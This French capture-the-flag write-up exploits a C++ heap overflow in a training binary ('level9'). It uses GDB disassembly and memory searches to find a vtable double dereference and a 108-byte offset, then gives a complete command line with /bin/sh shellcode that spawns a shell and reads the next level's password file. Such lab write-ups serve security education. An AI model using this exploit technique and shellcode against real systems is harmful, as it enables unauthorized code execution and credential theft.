On observe dans le code source que a->setAnnotation(argv[1]); ecrit sans verification de taille donc on peut faire un overflow

Nous allons overflow dans l'objet b, sachant que l'objet *b + *a donc la fonction operator+() de b est utilise. Donc si on reussi a trafiquer la memoir lie a b on pourra lance un shellcode :

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

Dans le code assembleur on peut voir apres setAnnotation :

0x0804867c <+136>:	mov    0x10(%esp),%eax
0x08048680 <+140>:	mov    (%eax),%eax
0x08048682 <+142>:	mov    (%eax),%edx
...
0x08048693 <+159>:	call   *%edx

ceci nous montre qu'il y a une double dereference pour acceder a la fonction operator+()
eax = b
eax = *b
edx = **b

donc on passe b->*b->**b, donc faut rediriger b vers notre buffer et que notre buffer redirige vers le shellcode sinon ca ne fonctionnera pas

On sait que esp+0x10 contient b car :

0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
0x0804863e <+74>:	mov    %eax,%ebx
0x08048640 <+76>:	movl   $0x6,0x4(%esp)
0x08048648 <+84>:	mov    %ebx,(%esp)
0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
0x08048650 <+92>:	mov    %ebx,0x18(%esp)
...
0x0804865c <+104>:	mov    0x18(%esp),%eax
0x08048660 <+108>:	mov    %eax,0x10(%esp)

_Znwj alloue de la mémoire et retourne un pointeur dans eax.
Ce pointeur est sauvegardé dans ebx, qui servira de this.
Ensuite, on prépare les arguments du constructeur (this dans esp, et 6 dans esp+4) puis on appelle le constructeur : call 0x80486f6 <_ZN1NC2Ei>.
Après l’appel, ebx contient donc un objet N initialisé avec la valeur 6, ce qui correspond à b.
Ce pointeur est ensuite stocké dans esp+0x18, puis recopié dans esp+0x10.



On cherche l'adresse du debut de notre buffer

(gdb) run $(python -c 'print "eeee" * 50')
(gdb) find 0x08048000, 0x09000000, 0x65656565

on obtient :

0x804a00c
0x804a00d
0x804a00e
0x804a00f
0x804a010
...

on peut considerer que la premiere adresse est l'adresse ou commence le stockage de notre buffer : 0x804a00c

Et il faut trouver l'offset pour ecrire dans b. Nous allons nous appuyer sur esp+0x10 pour voir quand nous ecrivant dans *b :

(gdb) run $(python -c 'print "e" * 111')
(gdb) x/x $esp+0x10
0xbffff6b0:	0x0804a078
(gdb) x/x 0x0804a078
0x804a078:	0x08656565

on peut donc voir que l'ont a ecrit 3 octets dans *b donc 111 - 3 = 108. L'offset est de 108

on peut donc construire le payload :

la premiere partie sera l'adresse de notre buffer + 4 octet pour rediriger vers le debut du shellcode : 0x804a00c + 4 = 0x804a010

la deuxieme partie sera le shellcode

la troisieme partie du remplissage

la quatrieme partie sera le l'adresse du de notre buffer qui est 0x804a00c

resultat : 

./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "e" * 76 + "\x0c\xa0\04\x08"')

On a ouvert un shell !

cat /home/user/bonus0/.pass

